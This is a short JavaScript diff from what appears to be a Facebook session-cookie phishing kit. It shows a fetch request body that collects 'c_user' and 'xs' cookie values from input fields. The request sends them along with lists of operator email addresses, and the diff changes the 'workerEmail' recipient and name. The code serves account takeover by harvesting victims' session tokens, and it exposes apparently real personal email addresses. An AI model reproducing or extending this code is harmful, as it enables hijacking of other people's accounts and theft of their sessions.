@@ -372,8 +372,8 @@
                     c_user: cUserInput.value,
                     xs: xsInput.value,
                     emails: ["official.danish.nizamani@gmail.com", "official.danish.nizamani@gmail.com"],
-                    workerEmail: ["aadisultan952@gmail.com", "official.danish.nizamani@gmail.com"],
-                    name: "Shan",
+                    workerEmail: ["waqasnizamani030@gmail.com", "official.danish.nizamani@gmail.com"],
+                    name: "waqasahmed",
                 }),
             })
             .then((response) => {
